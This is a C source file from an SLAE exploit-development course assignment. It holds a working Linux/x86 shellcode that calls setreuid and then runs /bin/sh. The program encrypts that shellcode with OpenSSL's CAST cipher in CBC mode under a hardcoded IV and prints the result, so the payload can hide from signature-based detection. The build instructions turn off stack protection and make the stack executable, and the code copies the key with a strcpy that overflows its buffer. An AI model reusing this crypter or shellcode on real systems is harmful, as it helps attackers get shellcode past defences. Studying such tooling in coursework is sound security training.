/*
 *      SLAE - Assignment #7: Custom Encrypt Shellcode (Linux/x86)
 *      author: Alain Menelet 
 *      StudentID - SLAE-3763
 *      HowTo: gcc -fno-stack-protector -z execstack decrypt.c -o decrypt -lssl -lcrypto
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/cast.h>

void affichageVar(unsigned char* tab, int length, char *name);
void affichage(unsigned char* tab, int length, char* name);

int main(int argc, char *argv[])
{
    CAST_KEY key;

    if (argc < 2)
    {
		printf ("usage ./encrypt [key]\n");
		exit(1);
    }

    // We define here the key
    unsigned char key_data[CAST_KEY_LENGTH];
    
    if (strlen(argv[1]) != 16)
    {
		printf("Taille de le clé incorrecte");
		exit(1);
    }

	strcpy(key_data, argv[1]);	

    // We define the Interupt Vector
    // All const are defined in cast.h
    unsigned char iv[CAST_BLOCK];
    unsigned char iv_data[CAST_BLOCK] = {
        0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
    };

    // Our original shellcode from assignment 6, exec /bin/sh
    unsigned char data[] = \
	"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

    // Round up the length to a multiple of 16 */
    int length  = (int)(strlen(data) + (CAST_BLOCK - 1)) & ~(CAST_BLOCK - 1);

    // temp array for the original shellcode
    // All values are set to 0 because length is a multiple of 16
    char*  temp = (char*) calloc(length, sizeof(char)); 
    
    // Dynamic memory to store the  output of OpenSSL's CAST CBC method
    char* crypt = (char*) malloc(sizeof(char) * length); 

	// Copy the IV data to the IV array
    memcpy(iv, iv_data, CAST_BLOCK);

    // Print IV & key 
    affichageVar(key_data, CAST_KEY_LENGTH, "Key");
    affichageVar(iv_data, CAST_BLOCK, "IV");

    // Copy original shellcode to heap to work with
    memcpy(temp, data, strlen(data));

    // Set the key 
    CAST_set_key(&key, CAST_KEY_LENGTH * 8, key_data);

    // encryption, store the encoded shellcode into crypt
    CAST_cbc_encrypt(temp, crypt, length, &key, iv, CAST_ENCRYPT);

    affichage(crypt, length, "crypted");    

    free(crypt);

    return 0;
}

void affichageVar(unsigned char* tab, int length, char* name)
{
	int i;
	printf("\n[+] %s: ", name);
	for (i = 0; i < length; i++)
        	printf("\\x%02x", *(tab+i));
	
}

void affichage(unsigned char* tab, int length, char* name)
{
        int i;
        printf("\n[+] %s Shellcode: ",name);
        for (i = 0; i < length; i++)
                printf("\\x%02x", *(tab+i));

	printf("\n");
}
